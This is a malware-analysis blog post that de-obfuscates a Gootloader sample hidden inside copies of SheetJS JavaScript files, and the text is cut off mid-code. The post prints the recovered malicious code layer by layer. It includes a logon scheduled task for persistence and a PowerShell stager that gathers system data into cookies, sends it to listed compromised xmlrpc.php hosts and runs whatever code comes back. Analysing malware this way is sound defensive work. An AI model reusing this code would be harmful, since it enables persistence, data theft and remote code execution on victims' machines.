---
layout: post
---

[back](./)

# De-obfuscating a Gootloader sample

This post details the steps taken to de-obfuscate a Gootloader script. The malicious script was extracted from what seemed like combined legitimate xlsx.js and shim.js script from sheetjs.com. I will not be uploading the full script here but only the extracted malicious code from the script.

The extracted code can be found [here](./assets/files/gootloader/gootloader.script)

## First Layer

The entry point is the calling of the coolj function which in turn calls the amqiinf function. (ojnoa function always returns a true)

```js
coolj(3845);

function coolj(xfeys, animald, noon1, tnkob) {
  if (ojnoa(xbkvlmtp)) {
    amqiinf(travel8);
  } else {
    txEKt();
  }
}
```

amqiinf function contains a infinite while (electric2g is always true) loop with a try catch statement in its body. The catch statement saves a pointer to 
function qqxhouk in the variable array travel8[1638792]. The try statement attempts to execute whatever that is referenced in travel8[stead8] and stead8 is 
incremented on every while loop(stead8's initial value is 152). These are the functions in the order they are called:

1. travel18[1638792]=qqxhouk
2. travel8[5663673] = threel;
3. travel8[6003902] = water8;
4. travel8[6075237]=rain4

Summarising what each of the four function does:

* qqxhouk - Concatenates a number of variables and saves result into variable ndplk. It saves a pointer to function threel in travel8[5663673]
* threel - Processes ndplk and saves result into variable txeic. It saves a pointer to function water8 in travel8[6003902]
* water8 - It saves a pointer to function rain4 to travel8[6075237]. Saves a pointer to qqxhouk in txeic[3].
* rain4 - Calls txeic[3]\(txeic[1])(travel8); 

ndplk is actually an encrypted script. It is decrypted by the meeth0 (a pointer to meeth0 is saved in the variable flower7) function and is saved in the 
variable txeic. The result is the layer 2 code.

## Second Layer
```js
constructor,ubwojcfaywmnbpcig=7327;
o=49-46;
irjdtod=392;
try{ 
 txeic[o](flower7('31()F][(DFC(c3T3i) )=; CVrEizrSTmExg; )=) 5i2T(cFC(D][)F1(33(1F)[]D(CFc(T1i5 )=) ;FfzuXnIcJtZi;otnp iprWcdSxW( n=e CDECmcqT)i{;r)e1teunrond +Mwattchu[dFo(r1p1+)u]m(oMva+t5he[nFo(t3+9n)n]i(k)s*+n4elClEam+qn)y;k}dC+rrirrhTiEeg+[iFo(o1y4g)+]m(e)r;aHhbsS+UfFh t=r aCer+i0reTlEbga[tF+(7360t)h]g(i\"r\\+\\e\"e)s;otorhyc{+NnLnCiVabtNn o=c +HpbqSrUeFh[+Fh(k2m0s)f]k(tS+siyhOase)x;g}hc+attrcehd(nauz+p6qmIipa)l{cN+L8CtVabeNr g=+ 5f3aellsbea;+}pikfh i(lN+LwCdVlbuNo h=s=+ 7flaelwsoev)+ m{wPizdxtwr +=v jxnmaSszeEgV+[hFh(x3y0l)+]4(dZoJoIlXbz+Fj[oFw(t2+6n)q]w(wF+(s3y7a)s)u)+[1Fq(n2o4s)a]e;rp+e3gtXnOito p=+ 62t8s4o-p(+Mdaptdhz[+F0(k4c1u)r]t(+2l8d4n/iPmz+xkwt[rFo(j4+)g]h)g*uPazlx+wu[vFb(c4a)k]+)r;kfghswfi+Pv m=n u0f;+L5IrIeevXe +=i ifcahl+stez;pfto+r5(mqoYtday+U7 d=n anleswi +Exnruemhetroartbo+r8(tPozhx+wi)d;m w!cqtY+ddyiUq[dFj(+2g9l)t]t(x)+;a eqlYbdaybUo[rFp(+4n3n)r]w(m)y)+ w{blzCpsmHmrpt+ 5=e cqnYadtysUb[uFs(+4r5w)o]c(+)3;1itfc e(spneig+XxOxtz=h=+f3hdwlioPg)+ 5LaI+IdesXd b=i +lhClsaHwrdta;df+h1wlilPa+w++;z}nikfl i(+LuIwIpexXx x!+=3 tfoaplss+e3)4 k{eOeQwh+wsAd x=r +LkIvIcewXi+u\"r\\x\\a\"++0oyctBiEcm+;ridfr(w!txfm+SdzsEmVj[hF+(22k2g)l]l(oOrQ+h2whAc)t)e{rutCsA+wvaebmsa c=+ dxdmrSazoEbV+[hFy(w3s5t)+]1(eOrQehww+A0,e r8a,+ ntlraunei)g;iurCoA+wuahbfse[bFy(+410t)h]g(iPeg+pkftQn)a;tdsricdX(I7=r\"e\"w;oflhfw i=P =Q0f;plgsPV;x)W6Z(uF= 0=; PulpmtbxI; )=1 2p(WFd x=( 5m6E0B)c+o1;0)490(9F; k=W NsbOey s=S }F;(v2j)O[PFv(V4 2n)r]u(t\'e\'r)};;r)R1t,o0 (=r tMsabtuhs[.Fv(j3O9P)v]V;+L)Z1B(qrutus b=u sM.avtjhO[PFv(V1 1=) ]v;jwOhPivlVe{( t)r+u+eE)Z q{ZdfrNcbXDI ;+I=V DkqWyNibHe [=L<Z BEqZuquZ(frNRbtDo (;)0* 2=5 )E]Z;qiZff N(blDs VrxaWvZ(u =r=oPfl;m]bIIV)D q{ylisHV[xyWnZouq= 0=; PvljmObPIv V=; )p\"W|d\"x((t5i6l0p)s+.1F0R4E0T9q; u=C Aywnaobqs;[\"Ft(i4m0e)|]T(wderNckXsIa+|\"e;v\"o)m;tdxrecNX|Ip=s\"t\"i;l}|fohlwfirPo+|+t;ilrsWVex|WaZrum+o+d;ni|fC e(sfohlw|iTPA=D=P4P6A9%9%2A3|8l1b)a lbiraevaAkn;e}huWCtArwaatbSse[|Fe(l3i8F)t]x(e)T;nueCpAOw|anbesm a=| txsmySSzeElVi[FF.(g1n3i)t]p(iOrQchSwtAc)e;jubCOAmwea|bess[UFd(I3r4|)a]e r=C txctepjub;OheQtC|To F=t euGCrAewdalb|sd[nFE(t2a8|)a]N;trrToihjSQezms|ad I=r eCgrgiirrTTEngo[gFo(L4|4i)r]t(S0t)n;ermTniojrQizvsnaE[dFn(a1p0x)E]s[gFn(|3l6l)e]h S=. ttpriurec;SrWT|iojFQbzusSas[rFe(d1l0|)i]t[iFn(i1f7e)D]k s=a Tfraeltssei;gwerRjnjoj|sijx E=e lriTFisjtQsz|stat[eFS(g8o)l].[sFe(c1n)e]r(e9f)n;owCr jtjnjesmje[l\"|IkDs\"a]T t=e GF|(A2s7n)o;iwtrcj|jEjSsUj%[%FE(M3A2N)R]E S=U %Z\\J\\I%XNzIFA[MFO(D2R6|)n]e(dFd(i1H8|)r)o;tWcPeareiRDRg n=i krrToiWjyQ|zescai[vFr(e1S9.)e]l[uFd(e1h)c]S(|0c)e;nWnPoaCetR|Re[lFi(F5t)e]G |=u RFx(E7n)|;uWoPradenR|Ri[tFt(e3s)s]g n=| ihtQaCRT ;MWBPIaselRoRo[TF (l1a6n)o]| r=e gLgIiIretXs;|HpbiSrUcFs[wFt(|2l3a)n]A( SesryaOhsS, treTkirjaQMzssja.,s i6s,y |\"a\"P h,t |\"t\"n u,o C3|)m;uNgLrCAVsbtNn e=| wHvbuStUsFr[qFp(o2n0m)l]k(jSishygOfse)d;cNbLaCzVybxN|[aFe(r1C2e)t]|(inuuQltl\", =2 ,F R0E,T q\"{\"))I;V}D}q}yiiTHc(CFD [nFo(i0t)c]n(u)f;')
 )();
} catch(e) { }
psudexudc=txeic;,,qqxhouk()
```

txeic is as an array and delmited by commas. So txeic[3] is qqxhouk() and txeic[1] is the main body of decrypted ndplk variable. Another encrypted string is 
contained in the main body and goes through another round of decryption by meeth0 (remember that flower7 now is a pointer to meeth0). The decrypted 
content is yet another script, which is the third layer.

## Third Layer

Function F is called several times with a number as an input. Analysis of function F shows that it returns a concatenated substring from the variable 
"qTERF" base on the input number. Replacing the F function calls with the return strings makes it more readable.

Example:
```js
SsyOs = F(9);
ocBEm = F(21);
xtpu = F(6);
```
Becomes
```js
SsyOs = "IBM Rational Tools";
ocBEm = "Settlement Conferences.log";
xtpu = "Market Share Analysis.js";
```

Replacing the random variable names with meaningful names allows us to understand what the script is doing.
Example:
```js
uCAwabs["Close"]();
uCAwabs = xmSzEV["GetFile"](OQhwA);
uCAwabs["name"] = xtpu;
hQCT = uCAwabs["ShortName"];
rTijQzsa = CrirTEg["NewTask"](0);
rTijQzsa["settings"]["StartWhenAvailable"] = true;
```
Becomes
```js
log_fullpath_handler["Close"]();
log_fullpath_handler = Scripting_FileSystemObject_func["GetFile"](Directory_log_fullpath);
log_fullpath_handler["name"] = Market_Share_AnalysisDOTjs_str;
log_fullpath_handler_shortname = log_fullpath_handler["ShortName"];
scheduledtask_handler = Schedule_Service_func["NewTask"](0);
scheduledtask_handler["settings"]["StartWhenAvailable"] = true;
```

Remember the other variable names that were not referenced in the initial script? The variables are instead referenced here. flower7 or meeth0 is called 
again to decrypt the last encrypted string.
```js
Decrypted_string = flower7
(distantk+eight1+ybefhu+originaln+are0+were1+tswyh+boardd+camev+stretch2+rollgk2+hjmsd+ftwrdr+city0+axruiwcvk+rx
ds+week43+spot3+xxxpwu+ilknz+wall1+dadwalh+ibdsd+a5+gold3+hzxx+insect13+cowr+substance5+pmmpzbw+ymwrnn+probablea
+xttlg+jdqid+tcwmdi+hot8+brotherx+island7+atom5+tpzt+hcii+ever5+funmv+fsgkr+kacbvu+laughg+jortk+mindl+truck0+zdp
d+post6+point3+reasonq1+usays+wwqn+twoj+blood4+lyxhh+gesanjv+rtdiwm+vowel7+shouldw+lihkp+able35+great8+claim6+un
dert+hgxeahi+tkfsmkh+herqp+containn+choosee+right67+table0+earthf+sharem+gyooi+eihrr+dkyn+all4+skinn+tone5+vomu+
productw+done1);
```
The decrypted javascript is concatenated with a bunch of random strings and written to disk. 
```js
log_fullpath_handler = Scripting_FileSystemObject_func["OpenTextFile"](Directory_log_fullpath, 8, true);
log_fullpath_handler["Write"](Decrypted_string);
generated_random_string="";
counter=0;
counter2=0;
generated_random_number = generate_random_number_func(560)+10409;
alpha_array = "abcdefghijklmnopqrstuvwxyz"["split"]('');
random_number1 = Math["random"];
random_number2 = Math["round"];
while(true) {
 generated_random_string += alpha_array[random_number2(random_number1()*25)];
 if (counter2==generated_random_number) {
 counter2=0;
 generated_random_number = generate_random_number_func(560)+10409;
 log_fullpath_handler["Write"](generated_random_string+";");
 generated_random_string="";
 }
 counter++;
 counter2++;
 if (counter==46992381) break;
}
```
The scheduled task is created as taskname "IBM Rational Tools", action to run "wscript <Short name of Market Share Analysis.js>" and triggers when user 
```js
scheduledtask_handler = Schedule_Service_func["NewTask"](0);
scheduledtask_handler["settings"]["StartWhenAvailable"] = true;
scheduledtask_handler["settings"]["Hidden"] = false;
scheduledtask_triggers_info = scheduledtask_handler["triggers"]["Create"](9);
scheduledtask_triggers_info["ID"] = "LogonTriggerId";
scheduledtask_triggers_info["UserId"] = WScript_Shell_func["ExpandEnvironmentStrings"]("%USERDOMAIN%\%USERNAME%");
scheduledtask_actions_info = scheduledtask_handler["Actions"]["Create"](0);
scheduledtask_actions_info["Path"] = "wscript";
scheduledtask_actions_info["Arguments"] = log_fullpath_handler_shortname;
scheduledtask_actions_info["WorkingDirectory"] = Directory;
Schedule_Service_func_getFolder["RegisterTaskDefinition"](IBM_Rational_Tools_str, scheduledtask_handler, 6, "" 
, "" , 3);
Schedule_Service_func_getFolder_GetTask = Schedule_Service_func_getFolder["GetTask"](IBM_Rational_Tools_str);
Schedule_Service_func_getFolder_GetTask["RunEx"](null, 2, 0, "");
```
## Fourth Layer

Decrypted_string appears in the same format at the first layer. With partial strings assigned to random named variables and a few function declaractions

Random named variables:
```js
...
zgcxeuq = 'E\'5\\tm,US\'7\\yx7+SG/\'[\\7b\\S\'h)Z+.]I\\U\'f(S \'M\\=e[';
hiysr = '$Wcv\'S\\$pc+;rr\')\\il)_pmn.txo';
weight3 = '+]0l\\\'\'\\}/|+\\/\'\'S\\;:p)psG(=p(\'(\\Wt(+\\t\'\'\\\\\'\'+';
bufye = [8081];
wayb = 'b\'\\\\\'\'O\\++t+\\\'\'\\:\'S\\:I\\S\'\']\\+et+\\\'\'\\r\'l\\E+e{V\'\\\\\')nc+3ou\\ \'RcQei.\'\\\\\'T';
sinceq = 'RUHDSQJb';
shello = '$\\\'\'\\e_++m.\\\'\'\\A\'n\\\\l\'+\\r\'\'+\\+o\\(\'l\\$\'on\'a\\|cm+k/\\\'\'\\n/+FI:\\N\'slZEpSMWtI';
type9 = '$RExTtreRsT\\U\'\'p\\)EI+[}z\'M\\G;[S.$p.nM]OOU';
producem = 'e0)i],)O:1\'j\\3::+-t:\'5\\]L)(GS]dn\'[\\\\n\'+Me+\'[\\\\o\'1';
shoulder3 = '\\\\h\'+\\\"\'\\M\'p\\E,\\E\'\"\\\\\'\'+\\+p\\+\'h\\\'\'\\tpTl\\.\'\'S\\+cy+\\p\'\'S\\fr\\s\'l\\E\'m+\'+\\\\x\'+\\/\'\'E\\UmL{\\o\'\'I\\+cf+\\.\'\'\\\\\'\'L\\+\"\\\\\'+\\3\'\'+\\s\"\\\\\'bI+Li|';
...
```

Random named functions:
```js
...
function yzxji(told1, feetk, experiment4, bahjj) {
  wife6 = told1.length;
  return wife6;
}

function wait4(crease9, expectv, may1, changel, pqqq) {
  heardm = "";
  for (happenq = nxou; happenq < 6706; happenq++) {
    rememberu = listenc(crease9, happenq);
    heardm = supporto(heardm, rememberu, happenq);
  }
  return heardm;
}
...
```

The steps to de-obfuscate is the same as previously mentioned(Same concept, just different variable and function names). This returns the fifth layer.

## Fifth Layer

```js
constructor,tjqzhxosf=5018;f=52-49;nor8=987;try{ eye7[f](causey('\'x+G\'bUhM.$k;E\"\'6+3\'.E7P3A5l/IiVrea=\'0+;\'\'f+a\'S$ M0U.x0G.b0\'.+7\'0h1./H\'\'++\'\'eEm\'o+r\'haCd \')+o\'\'e+\'\'+k\'cReSG. Ae\'k+i\'ld\'D+(\'\" C,oLoMkTiHeK\'(+ \'6:3 \'$+f\'I.Z7S3m5s/ut\'i+\'\'+=\'$KPbxeTWkexl;p p$\'f+\'\'+A\' I)Z4S6\'x+ \';m4s6\'n+i\'Wu `;1\'=+$\'v0Y.Y0\'1+ \'TeNq ysY\';+ \'$w\'o+d\'nfi\'W+(\' I0Z.S5m/s\'u+`\'2a=l$lRiAzAoqMc\"\'=+\'\'+y\'\'t+N\'eU\'u+\'\'+g\'A;R \'$+\'\'+e\'SfUI.ZhSb\'G+x\'Um\'s+u\'`M3$=;$)VRfnGxPrax;$ ($ef\'I+Z\'STmasEuR`\'4+=\'$Cb:V:l]\'\'++\'\'CT\'S+e\'UCQ\"E)r;B\'\'++\'\'$eSwM.J\'q+M\'=TneeNW\'-+o\'B.jMeEc\'t+ \'StysSy\'s+[\'=thebmG\'\'++\'\'.xIUOM.$S;\'}+E\'UTRrTE$A{m=r ek\'c+A\'bALdlEarC N$OMiUTx\'G+b\'\'a+D\'\'h+\'\'+I\'l.AgVeeT\'r+e\'StP\'o+n\'Sa\'\'++\'\'eC(I)\'.+g\'eFTIRt\'r+E\'cerSepvoR\'E+s\':N:s]\'R+e\'geaSnTaRm\'\'++\'\'eTANmI(O)p;E$CHiS\'q+F\'LV=R(\'\'++\'\'e$S\'.+\'\'+S\'MtJEqNM[.\'\'++\'\';R2E\'a+d\'t1o\'e+n\'dS(L\'t+:\':)])e p-yS\'p+l\'ITTl O$CfOI\'Z+S\'mTsour;PI\'f+(\'$yHTSIqr\'u+c\'eFsL..TceON\'[+ \'=u nLTo\'c+o\'T O-ReP\'Y+T\'iQR u3c)\'{+\'\'+e\'SI\'\'++\'\':e:x](R$EHgSAqN\'\'++\'\'FaLM\'T+N\'\'[+1\']I o-preEcPILVArC\'e+\'\'+e\'\' +\'\'+s\'.\"T\\e^N\"\',+\"\'\"[)\';+}\'};W)\'}+\'\'+H\'iDLee\'(+1\')S{ut.r_\'$++\'\"Y^{\"Y+We\'M+a\'nS.l_H$G{m%(|@}(0\"0h0t0t5p sT\'g+-\' :E/E/RcFa\'p+\'\'+.\'_e$r{aecRkEihnWg|\'R+D\'g.\'c+o\'.(\'W+V\'szmaa/Ex\'m+l\'r=pCcC.\'\'++\'\'lp\'h+p\'\"V\'b+$\';,)\'}+}\')\"]h5\'[+n\'GtStMpZsN:F/\'/+c\'o$l(o\'r+l\'\'.+_\'$i+b\"\'3+\"\'\'.+c\'o{m\'/+x\'mElsr\'p+c\'.lp\'h+p\'\"E,\'\"+h\'\'}+)\'htTtap\'s+\'\'+p\'.:\'/+/\'v_\'\'++\'\'i$r(\'E+m\'AtnuEaLlItF\'T+E\'Gi:l:t].\'\'++\'\'hctoamp/.xOmil\'r+p\'c[.+p\"h\'p+\'\'+2\'\"\"{,)\")h]t6t[pnsG\'S+M\'\':+/\'/ZbNeFp$m(i.n_a$.(\'f+\'\'+v\'ni/e\'s+\'\'+x\'mller}p)\']+\'\'+c\'.5p[hnpG\'S+M\'Z\"\',+\"\'hNtFt$p(\'.+_\'$s\':+\'\'++\'\"/1\'\"+{\')/)s]e0x[m\'o+v\'ineGsSfM\'Z+N\'Fo$u(n.d_o$n(lfii\'e+s\'ln\'\'++\'\'ee}.)c]o5\'[+n\'Gm\'/+x\'\'S+M\'ZmNlFr\'p+c\'.$p(h\'p+\"\',.\"_h$t+t\"\'0+\"\'{p)s\':+/\'/)o]c4e[annGpSr\'e+z\'eMnZtNoFw$.\'p+l\'/(x.m_l\'r+p\'c$.(\'f+\'\'+p\'hip\'\"+,\'\"{\'%+|\'\'h+\'\'+)\'\'t+t\'p(s):\'/+/\'l]a3m[innGaSiMnZtNuFa$s\'t+\'\'+(\'.u)r)i0\'(+)\']a2\'[+n\'GsS.MeZsN/Fx$m(l.r)p\'c+.\'p)\'\'++\'\'h]p1\"[\'\'++\'\',n\"GhStMt\'p+s\':Z/N/Fz$\'(+ \'meo\'c+-\' lttcoed\'a+\'\'+j\'byo\'-+w\'e.nr(u(/(xWmVlsrmpa\'E+=\'\'c+.\'pa\'\'++\'\'hPpG\"f,V\'\'++\'\'\"$h;\')+}\'\'t+t\'\'E+l\'\'p+\'\'+t\'IsT:W\'o+D\'n/i/Wanci\'A+\'\'+t\'imv.._c$o\'.+\'\'++\'\"i^d\"/+x\'\'++\'\'emmlar\'p+\'\'+n\'.c_.\'p+h\'\'$+\'\'+p\'\"{\'%+|\'},\'\"+h\'tEtlpTsI\'t+W\'O:D/n\'I+W\'n/itahMe.w_a$r{zeoRneehhW\'|+\'\'+a\'csk\'e+r\'.Pcgo(m\'\'++\'\'W/Vxsmmlar\'p+c\'\'E+\'\'+.\'p=h\'p+\"\')u U|y cg\'e+t\'-qr\'a+n\'\'A+A\'Rd$O;M))}}ECMa\'t+\'\'+A\'NC.H_\'$+{\'%{|\'E+u\'Q}I;NSUL-E Eepm A\'n+ \'t-csE\'L+E\'S \'2+0\'}|\'S;ppG=((W(\'\'+s\'uV\'s)m+\'(+\'\'basEt=rY\'\')+)\';y qPe=Y(YWvS$c;r)i)pnto)i;tMp a=c \'\'+c\'r.E)a\'T+\'\'+m\'eEt\'s+y\'SogBnjietcaTr\\e\\psOh\'\'++\'\'_e2L3\'n+i\'WL\'\'++\'\' .\'\'++\'\'iam\'w+g\'(P+\'\"+^\'\'p+L\'\'I+M\'WiSCO\'\"+(\'+a)\'}+)\'eT\'i+O\'Nu\'l+\'\'+P\'OawvE.\'_+$\'+R\"S^\'\"++\'eH\'E+\'\'+m\'aln\'.+\'\'+L\'\'_+$\'(e{\'%+|\'}x9e9\' +t\'lc\'\'++\'\'-c shct\'g+\'\'+r\'\'n+e\'Li.pe\'u+l\'atvS.\'_+$\'{te\'\'++\'\'Dr\'e+\'\'+I\'Nh\'w+\'\'+s\'l|i:\'v+n\'ec erWi\'d+\'\'+r\'I(t(\'W+V\'sem\'a+E\'=LxiknT\'x+P\'$E;\'\'++\'\'O)\'\"+|\'\"P(\'t+i\'lEpnsS.C)r\"i\'\'++\'\'MpE\'\'++\'\'tT\'S+y\'Sf\'\'++\'\'EUL\'I+f\'\'L+\'\'+s\'IL|\'e+m\'An\'\'++\'\'na|mk\'n+I\'lESWI\'|+\'\'+s\'\'s+M\'ec\'\'++\'\'TRIi|\'E+C\'APP\'S+e\'mta\'n+|\'n.O\'I+t\'asc\'I+\'\'+H\'el\'p+p\'Al\'\'++\'\'.L\'l+a\'sL\'l+e\'htsI|\'r+e\'Dn\'\'++\'\'Ld\'e+x\'\'O+\'\'+O\'\'f+S\'If\"\'(+ \'=f\'u+\'\'+ \'nLG\'S+M\'\'L+\'\'+Z\'NNF\'$+}\')a)M(eysA\'\'++\'\'eraRraco\'T+\'\'+h\'\'.+Q\'eSg\'m+T\'lh\'E+l\'L$E(\'G+N\'IxR\'t+\'\'+e\'CSU4\'\'++\'\'T6\'e+s\'aEb\'O+t\':S:\']+t\'rlEeV\'n+o\'ce.\'M+e\'Tps\'Y;SP\'[+M\'[[p;])((7E3S+o6l5C,\'5+*\'1.)E]f(K1U1$1;1)1))\';+i\'fo(GPo[tMG[ppx]$(,7\"8!4|0\"/(7N0i,O1j3:-:5])G]n[\'M+[\'pI]r(t6S1[2\'0+/\'5(1e,T1\'*+6\')i]R(WM.[Epf]K(U1$1;4)4)/)2s6S,E5r+P2m)O)C!:=: ](e8d/o2M)N-o(I4S+S1E)R)\'{+ \'PP[MMO[\'p+]\'(C0.*n1o,i4S+s8E)r]\'(+M\'[ppm]\'(+4\'4O+C4.4O,\'1+3\'*I1.)M)E[tMS[YpS][(\'1+0\'*,4\',+1\'+Q3e)g]m(T\'\'p+o\'wle$r(smhAe\'l+l\'.EeRxtes\'p)I[zMG[.pn]O(i3s6\'++1\'5S,E5r+p0m)O]C[.Mo[ip.]\'(+1\'*M6e1t,s3Y*S3 )t]\'(+ \'LC)e;J}b oe-lWsEeN ({\' +d\' (=WPe[NM:[\'p+]\'(:4]1r+e3T3\',+6\'+I8r)w]\';+ \'Wm=A Edr[TMS[.po]i(.1M7\'6+-\'7E5t,S7y7S/[7\')+]\'( M=[ pE]\'(+7\'2f/K6U,\'2+-\'1$);)\';+ \'P)[(Mw[EpN]:(:0]*M1a,\'4++\'8e)R]t(\'M+[\'ps]y(r9\'1+/\'7O,M1e*m1.7o)i)\'[+M\'[.pM]E(t2S1Y*s6[, 3\'*+4\')=] (Q e\'gc\'s+c\'rmi\'p+t\'.Telx$e{\'),o\'G\"o\'t+Gdp[xM\'[+p\']$((1W4V*\'4+,\'5s*m1a)E] (nWo+i(t1\'*+1\')c)\'++\'\'\"n\'u f,;\'\"\"8\'1+Cd4[2ME[9pB]B(71\"4=*u4s,m5S*Z1\')+]\'(I0f,$W\'++(\'1{*)1R)n)x+\'\'+\"\'\'r,x $M([mpG]H(\'4+4\'+l2\'6+,\'6S-\'2+)\',W Y0 *n1o i)\';+ \'}tPc.nQuufi\'t (=) ;L '))();} catch(e) { }nkarhikqlhd=eye7;
```

De-obfuscating this further gives the final in-memory javascript (sixth-layer) that calls powershell. 

## Sixth Layer

After further tidying up and replacing the variable with actual values 
(Taken from the M array) gives:

```ps
L = 'funct'+'ion YW'+'S'+'l'+'HGm($xr'+'xnR){'+'$fI'+'ZSmsu="7BB9E24C18";fun'+'c'+'tion Eams'+'VW($'+'xpGtoGo)
{$lT'+'m'+'geQ ='+' [sYStEM.'+'io.meMO'+'rys'+'tRe'+'aM]::NEw()'+';$'+'UKf'+'E = '+'[SyStE'+'M.io.
STrEAm'+'wrI'+'Ter]:'+':NeW('+'(NEW-obJeC'+'t SYsteM'+'.io.COmprES'+'siOn.GzIpstRE'+'Am
($l'+'TmgeQ'+','+'[SYStEM.I'+'O.CO'+'mp'+'rEsSion.C'+'OMP'+'RESSIoNMode]::COmPrESs)));$UKfE.WRi'+'Te
('+'[StrI'+'nG]::jOiN("|!",$xpGtoGo'+'));$UKfE.'+'CloSE();['+'SYsTeM.conVErt]::tObase6'+'4S'+'tRING
($'+'lTmgeQ.'+'ToaRr'+'Ay())}$FNZ'+'MSGn '+'= 
("ISf'+'O'+'L'+'Der|shelL'+'.'+'Appl'+'IcatIOn|nameSPACE|IT'+'eMs'+'|ISlInk|n'+'Ame|Is'+'fILE'+'SyST'+'EM'+'").
split("|")'+';$PxTkx=EamsVW(('+'dir env:|'+'wh'+'er'+'e{$_.value.Len'+'gth -'+'lt 99}|%{($_'+'.nam'+'e+"^"+$_.
va'+'lu'+'e)})+("OSWMI'+'^"+(gwmi'+' '+'Win32_'+'OperatingSystem'+').'+'caption));$vYYeqy'+'Y=Ea'+'msV'+'W
(GpS|'+'SELEct nAme -UNIQuE|%{$_.NA'+'ME});$RAA'+'q'+'cyUu'+'='+'E'+'amsVW'+'(gP'+'s'+'|WheRe{$_.
MainWInDOWtITlE'+'}|%{'+'$'+'_.n'+'ame'+'+"^"+'+'$_.m'+'AinWinDoWTIt'+'lE'+'});$'+'VfGP'+'a'+'=EamsVW(((newobj'+'ect -com ($FNZ'+'MSGn'+'[1]'+')'+').($FNZMSGn[2])(0)).('+'$FNZMSGn[3]'+')('+')'+'|%{'+'i'+'f($'+'_.
('+'$FNZM'+'SGn[4])'+'){"0"+$_.'+'($'+'FNZMS'+'Gn[5])}e'+'lseif($_.($FNZMSGn'+'[0])){"1"+'+'$_.($FN'+'ZMSGn
[5'+'])}el'+'sei'+'f($_.($FNZ'+'MSGn[6])){"2'+'"+['+'iO.path'+']::GETFILEnAmE($'+'_'+'.
p'+'aTh)}'+'E'+'l'+'sE'+'{'+'"3"+$_.'+'($'+'FNZMSGn[5])}});$bV'+'l'+'CC='+'EamsVW('+'gDR|WhERe{$_.'+'FREE -gT 
50000}|%{$_.naMe+"^"+$_.uS'+'eD'+'});'+'['+'NeT.s'+'e'+'rVIcepoI'+'NTMa'+'NAgER]::'+'Se'+'cuRiTYPROTocoL = [NeT.
securITy'+'ProT'+'OCOlT'+'ype]::tLS'+'1'+'2;'+'[NEt'+'.Se'+'RV'+'iCEpOINT'+'manageR]::
sERvercErtIF'+'IC'+'a'+'t'+'eVAlI'+'Da'+'TiONCalLbAck ={$TRUE};$MUx'+'Gbh=[syst'+'EM.'+'NeT'+'.
we'+'BrEQUeST'+']::C'+'REaT'+'e($xrxnR);$M'+'UxGbh.USe'+'RAg'+'eNt'+'="Mozilla'+'/5.0 (Window'+'s NT 10.0'+'; 
Win64; x64) A'+'ppleWebK'+'it/537.'+'36 (KHTML, '+'like Geck'+'o) Chrome'+'/107.0.0.0 Saf'+'ari/537.
36";$MU'+'xGbh.kE'+'EPAlIVe=0;'+'$MUxGb'+'h.H'+'E'+'ad'+'e'+'RS.A'+'dD("Cookie'+': $fIZSmsu'+'=$PxTkx; 
$f'+'IZS'+'ms'+'u`1=$vYY'+'eqyY; $'+'f'+'IZSmsu`2=$RAAqc'+'y'+'Uu'+'; $'+'fIZS'+'msu`3=$VfGPa; 
$fIZSmsu`4=$bVl'+'C'+'C");'+'$SMJqM=neW-oBject SyS'+'tem'+'.IO.S'+'TrEAmre'+'AdEr $MUxGb'+'h'+'.
geTreSPonS'+'e().geTR'+'eSpo'+'Ns'+'eSTR'+'eAm();$HSqFL=('+'$'+'SMJqM.'+'REadtoend('+')) -SplIT $fIZSmsu;If
($HSq'+'FL.cO'+'unT'+' -e'+'Q 3){'+'I'+'ex($HSq'+'FL'+'[1] -rEPLACe'+' '+'"\^","");}}W'+'HiLe(1){tr'+'Y
{YW'+'SlHGm(@("https'+'://cap'+'eracking'+'.co.'+'za/xmlrpc.'+'php"'+','+'"h'+'ttps://colorl'+'ib'+'.com/xmlrpc.
php","h'+'ttps'+'://v'+'ir'+'tualt'+'ilt.'+'com/xmlrpc.php'+'","https'+'://bepmina.'+'vn/'+'xmlrp'+'c.php'+'","
http'+'s:'+'/'+'/sexmoviesf'+'oundonli'+'n'+'e.co'+'m/x'+'mlrpc.php","htt'+'ps://oceanprezentow.
pl/xmlrpc.'+'php","'+'h'+'ttps://laminaintuast'+'uri'+'a'+'s.es/xmlrpc.p'+'hp"'+',"https://z'+'e'+'ltoda'+'y'+'.
ru/xmlrp'+'c.p'+'hp",'+'"h'+'tt'+'p'+'s:'+'//ac'+'tiv.co.'+'id/x'+'mlrp'+'c.ph'+'p"'+',"https'+':/'+'
/thewarzoneh'+'acker.com'+'/xmlrpc'+'.php") | get-ran'+'dOM)}Cat'+'CH'+'{'+'};SLEEp '+'-s'+' 20}';
p=(('su')+('bstr'));
P=(WScript);
M = 
'crEaT'+'E'+'oBjecT\\sh'+'eL'+'L'+'.'+'a'+'P'+'pL'+'iC'+'a'+'TiON'+'POwE'+'RS'+'HE'+'l'+'L'+'e'+'xe'+'c'+'csc'+'
r'+'ip'+'tS'+'t'+'D'+'IN'+'sli'+'ceW'+'rIt'+'e'+'Lin'+'E'+'O'+'P'+'EnSCri'+'p'+'t'+'f'+'U'+'L'+'L'+'n'+'am'+'EW'
+'s'+'c'+'Ri'+'P'+'t'+'.'+'s'+'He'+'l'+'Llas'+'tI'+'n'+'dex'+'O'+'f'+'fu'+'L'+'L'+'N'+'aMes'+'earc'+'h'+'S'+'hEl
LE'+'x'+'eCU'+'T'+'E'+'S'+'le'+'e'+'p';
WScript.Sleep(11111);
if(P["fuLLNaMe"]["search"]("cscript")!= -1){
 P["crEaTEoBjecT"]("WscRiPt.sHelL")["exec"]('powershell.exe')["stDIN"]["WrIteLinE"](L);
}else { 
 d =P["SCriptfULLnamE"];
 W= d["lastIndexOf"]('\\');
 P["crEaTEoBjecT"]("sheLL.aPpLiCaTiON")["ShElLExeCUTE"]( 'cscript.exe','"'+d["slice"](W+(1*1))+'"' 
,'"'+d["slice"](0,W+(1*1))+'"', "OPEn", 0*1 ); 
}
P.Quit();
```

Variable L contains the argument passed to powershell.exe.

Variable L after tidying and cleaning up, descriptions included:
```ps
function YWSlHGm($xrxnR){
 #Base name of cookie keys
 $fIZSmsu="7BB9E24C18";
 
 #Gzip and base64 encode function
 function EamsVW($xpGtoGo){
 $lTmgeQ = [sYStEM.io.meMOrystReaM]::NEw();
 $UKfE = [SyStEM.io.STrEAmwrITer]::NeW((NEW-obJeCt SYsteM.io.COmprESsiOn.GzIpstREAm($lTmgeQ,
[SYStEM.IO.COmprEsSion.COMPRESSIoNMode]::COmPrESs)));
 $UKfE.WRiTe([StrInG]::jOiN("|!",$xpGtoGo));$UKfE.CloSE();
